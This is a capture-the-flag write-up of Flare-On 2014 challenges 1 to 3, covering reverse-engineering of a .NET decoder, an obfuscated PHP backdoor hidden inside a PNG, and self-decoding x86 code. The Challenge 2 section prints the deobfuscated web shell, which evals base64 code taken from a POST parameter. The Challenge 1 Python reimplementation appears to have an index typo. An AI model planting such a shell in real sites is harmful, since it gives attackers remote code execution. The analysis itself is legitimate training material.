# FireEye Flare-On 2014

## Challenge 1

We are given a .NET executable. Opening it in dnSpy reveals the following
code for a decode function:

```
private void btnDecode_Click(object sender, EventArgs e)
{
    this.pbRoge.Image = Resources.bob_roge;
    byte[] dat_secret = Resources.dat_secret;
    string text = "";
    foreach (byte b in dat_secret)
    {
        text += (char)((b >> 4 | ((int)b << 4 & 240)) ^ 41);
    }
    text += "\0";
    string text2 = "";
    for (int j = 0; j < text.Length; j += 2)
    {
        text2 += text[j + 1];
        text2 += text[j];
    }
    string text3 = "";
    for (int k = 0; k < text2.Length; k++)
    {
        char c = text2[k];
        text3 += (char)((byte)text2[k] ^ 102);
    }
    this.lbl_title.Text = text3;
}
```

After saving the `dat_secret` file from the resouces in the executable, we
can run the following re-implementation of the decryption function in
python:

```
f = open('dat_secret', 'rb')
x = f.read()

y = ''
for i in x:
    y += chr(((i>>4) | ((i<<4) & 240)) ^ 41)

y += '\0'
print(y)

z = ''
for i in range(0,16,2):
    z += y[i+i]
    z += y[i]
print(z)

w = ''
for i in z:
    w += chr(ord(i)^102)
print(w)
```

It took me a while to find the flag, since I was only looking at the final
output of the decryption. As output to the first step of the decryption, we
get the flag: `3rmahg3rd.b0b.d0ge@flare-on.com`

## Challenge 2

I wasn't able to extract the zip file at first. Turns out the native
Windows zip extractor doesn't support passwords? I tried turning off and
excluding the folder from Windows Defender and after a while downloaded
7-zip and it was able to extract the challenge successfully.

Moving on to the challenge... in the given HTML file at line 152 towards
the end we have the following code: `<?php include "img/flare-on.png" ?>`

At the end of the image file, we find the following php code:

```
<?php $terms = array( "M", "Z", "]", ... "4", "8", "e", "|");
$order = array( 59, 71, ... 29, 47);
$do_me = "";
for ($i = 0;$i < count($order);$i++)
{
    $do_me = $do_me . $terms[$order[$i]];
}
eval($do_me); ?>
```

Printing the `$do_me` variable at the end gives us the following output:

```
$_= \'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\';$__=\'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\';$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";eval($___($__));
```

`$___` is hex encoded ASCII string:

```
>>> '\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65'
'base64_decode'
```

So we are basically base64 decoding `$__` and eval'ing it.

```
$ echo JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7 | base64 -d
$code=base64_decode($_);eval($code);
```

Now we see that `$__` is base64 decoding `$_` and eval'ing that. So `$_` is:

```
if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) { eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"])); }
```

We can see that the POST parameter is a mix of decimal and hex characters. So I
wrote a python script to decode it for us:


```
enc = r"\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"

ans = ''
for i in enc.split('\\'):
    if i == '':
        continue
    if i.startswith('x'):
        ans += chr(int(i[1:],16))
    else:
        ans += chr(int(i))

print(ans)

#a11DOTthatDOTjava5crapATflareDASHonDOTcom
```

Flag: `a11.that.java5crap@flare-on.com`


## Challenge 3

We are given a binary file named `such_evil`.

After loading it into IDA, we see that there is a `call sub_401000` in the
entry function. In this function there are a lot of single byte move
operations and towards the end, there is a call to the start of the address
space in which these single byte move operations start.

Basically, this means that we have moved data that is now going to be
interpreted as instructions. To analyze this code, we need to set a break
point right after all the code is moved into memory.

The instructions are a bunch of loops that decode multiple strings. It can very
easily be dynamically analyzed by setting a break point right after a loop ends
and inspecting the memory. As we can see, the last string is the flag.

```
debug007:0019FD50 aAndSoItBegins db 'and so it begins'
debug007:0019FDA3 aGetReadyToGetN db 'get ready to get nop',27h,'ed so damn hard'
debug007:0019FE59 aSuch5h31101010 db 'such.5h311010101@flare-on.com'
```

Flag: `such.5h311010101@flare-on.com`
